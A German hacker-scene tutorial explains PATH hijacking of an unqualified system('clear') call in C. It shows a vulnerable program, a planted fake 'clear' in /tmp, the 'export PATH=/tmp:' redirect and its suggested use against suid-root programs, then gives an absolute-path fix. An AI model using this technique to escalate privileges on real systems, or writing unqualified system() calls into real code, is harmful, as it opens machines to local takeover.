~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*******************************************************
#            APPSECURITY DOCUMENTATION                #
#       --------------------------------------        #
#                  Path Attacks                       #
#       --------------------------------------        #
#                                                     #
#                                                     #
#  written by fred777 [fred777.5x.to]                 #
#                                                     #
*******************************************************
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

--[0x00]-- Intro
--[0x01]-- Knowledge
--[0x02]-- Exploiting
--[0x03]-- Secure Example
--[0x04]-- Finito

********************************************************
##################################################

--[0x00]-- Intro

Willkommen zu meiner kleinen Description über PATH Attacks.
PATH Attacks sind eine Art Angriff auf unsichere system() Aufrufe.
Meistens gesehen in kleinen Programmen, ja auch ich habe sie benutzt *g

########################################################################

--[0x01]-- Knowledge

Stellen wir uns mal vor, wir haben nun ein solches Programm gefunden, welches
am Schluss des Codes immer ein system("clear") benutzt, damit die Konsole auch wieder schön sauber ist. 
Hier mal ein kleiner Beispielsource in C:

#include <stdio.h>

int main()
{

printf ("Firmenverwaltungssoftware 1.0\n");
printf ("Eep, hier wird verwaltet...blub\n");
system("clear");

}

ubuntu@ubuntu:~$ gcc -o prog prog.c
ubuntu@ubuntu:~$ ./prog
...

Man sieht hier am Ende ein System() Aufruf welcher clear aufrufen soll.
Nur wo liegt das Problem dabei?
Ganz einfach, wenn man mal nachdenkt woher system() weiß, wo clear 
letztendlich liegt, nämlich in /usr/bin/clear.
system() macht nichts anderes als in den Verzeichnissen welche
in der PATH Environment Variable angegeben sind, zu suchen. 
Schauen wir uns doch einfach mal den jetzigen Inhalt von $PATH an:

ubuntu@ubuntu:~$ $PATH
bash: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:

So hier sieht man, dass der System() Aufruf in:
/usr/local/sbin:
/usr/local/bin:
/usr/sbin:
/usr/bin:
/sbin:
/bin:
/usr/games:
nach "clear" sucht, und es letztendlich in usr/bin: findet.

########################################################################

--[0x02]-- Exploiting

Nun kommen wir zum eigentlichen Kern des Papers, wir verändern einfach
den Inhalt und leiten den Aufruf zu unseren Gunsten um, das geht mit export:

export [Var]=[Verzeichnis]

Zuerst einmal erstellen wir aber ein eigenes Clear welches später anstatt
des Unix-Clears ausgeführt werden soll, für den Anfang reicht ein normales printf in /tmp :>

#include <stdio.h>

int main() {

printf("\n");
printf("Your 0verl33t Shellcode");
printf("\n");

}

ubuntu@ubuntu:/tmp$ gcc -o clear clear.c
ubuntu@ubuntu:/tmp$ ./clear
..

Klappt auch so weit ;)
Nun kommt unser oben schon erwähntes export an die Reihe, dafür
switchen wir wieder zu unserem "prog" ins Verzeichnis:

ubuntu@ubuntu:/$ export PATH=/tmp:
ubuntu@ubuntu:/$ $PATH
bash: /tmp:: No such file or directory

Wir merken schon, ein normales ls -l schlägt fehl..
Wunderbar, nun sollte system() in /tmp suchen und unser clear-programm finden

ubuntu@ubuntu:~$ ./prog
Firmenverwaltungssoftware 1.0
Eep, hier wird verwaltet...blub

Your Shellcode <-----

Ohne Privis zu droppen führt jetzt das Programm (suid root) unser Clear aus..
Hier nur ein printf, später vielleicht eine Shell?...

########################################################################

--[0x03]-- Secure Example

Wir wollen aber nun unbedingt ein clear ausführen am Ende das Programms,
welches sicher ist, dafür müssen wir nichts weiter machen als den absoluten
Pfad anzugeben, welcher wie wir wissen /usr/bin/clear ist..

#include <stdio.h>

int main()
{

printf ("Firmenverwaltungssoftware 1.0\n");
printf ("Eep, hier wird verwaltet...blub\n");
system("/usr/bin/clear");

}

ubuntu@ubuntu:~$ gcc -o prog prog.c
ubuntu@ubuntu:~$ export PATH=/tmp:
ubuntu@ubuntu:~$ ./prog
*funktioniert..

Klar gibt es noch einige Lösungswege, auch außerhalb von system(), dies sollte
aber eher als kleine Einführung dienen. Wichtig auch, dass jeder User seine eigenen
Environment Variablen hat. Taucht so ein Fehler auf, sollte der Angreifer schon
Zugang zu einem Account haben und das Programm mit Root Rechten ausgestattet sein.

########################################################################

--[0x04]-- Finito

So ich hoffe als kleine Erklärung hat das gereicht, ihr könnt ja selbst mal
was nettes basteln wie eine Remote Shell, oder was auch immer....

fred777.5x.to
            